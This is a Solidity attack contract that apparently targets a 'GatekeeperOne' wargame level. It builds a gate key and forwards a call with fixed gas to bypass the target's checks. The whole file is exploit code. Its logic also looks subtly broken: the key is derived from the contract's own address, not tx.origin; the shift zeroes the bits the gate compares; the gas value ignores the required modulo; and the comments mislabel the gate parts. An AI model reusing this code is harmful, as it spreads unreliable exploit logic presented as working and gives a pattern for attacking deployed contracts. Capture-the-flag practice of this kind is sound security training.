// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public gatekeeper;
    bytes8 public gateKey;

    constructor(address _gatekeeperAddress) {
        gatekeeper = IGatekeeperOne(_gatekeeperAddress);

        // Calculate the gateKey based on the address of this contract
        uint64 key = uint64(uint16(uint160(address(this)))); // gateThree part three
        key = key << 32; // gateThree part one
        gateKey = bytes8(key); // GatekeeperOne uses bytes8 for the gateKey
    }

    function attack() public {
        // Call the enter function with the calculated gateKey
        (bool success,) = address(gatekeeper).call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success, "Gatecrasher: Failed to crash gate");
    }
}
